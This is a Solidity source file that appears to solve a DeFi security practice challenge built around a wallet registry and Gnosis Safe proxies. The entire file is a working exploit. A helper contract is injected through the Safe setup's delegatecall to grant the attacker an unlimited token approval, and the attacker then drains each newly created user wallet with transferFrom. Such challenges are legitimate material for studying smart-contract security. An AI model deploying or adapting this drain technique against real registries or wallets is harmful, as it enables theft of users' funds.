// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./WalletRegistry.sol";
import "hardhat/console.sol";

contract BackdoorCallback {
    function callback(address token, address attacker) public {
        IERC20(token).approve(attacker, type(uint256).max);
    }
}

contract BackdoorAttacker {
    constructor(address[] memory users, WalletRegistry _registry) {
        IERC20 token = _registry.token();
        GnosisSafeProxyFactory walletFactory = GnosisSafeProxyFactory(
            _registry.walletFactory()
        );

        address[] memory owners = new address[](1);
        BackdoorCallback backdoorCallback = new BackdoorCallback();

        for (uint i = 0; i < users.length; i++) {
            owners[0] = users[i];
            bytes memory initializer = abi.encodeCall(
                GnosisSafe.setup,
                (
                    owners, // _owners
                    1, // _threshold
                    address(backdoorCallback), // Contract address for optional delegate call.
                    abi.encodeWithSelector(
                        BackdoorCallback.callback.selector,
                        address(token),
                        address(this)
                    ), // data payload for delegate call
                    address(0), // fallbackHandler
                    address(token), // paymentToken
                    0, // payment
                    payable(msg.sender) // paymentReceiver
                )
            );

            GnosisSafeProxy proxy = walletFactory.createProxyWithCallback(
                _registry.masterCopy(),
                initializer,
                0,
                _registry
            );

            token.transferFrom(
                address(proxy),
                msg.sender,
                token.balanceOf(address(proxy))
            );
        }
    }

    receive() external payable {}
}
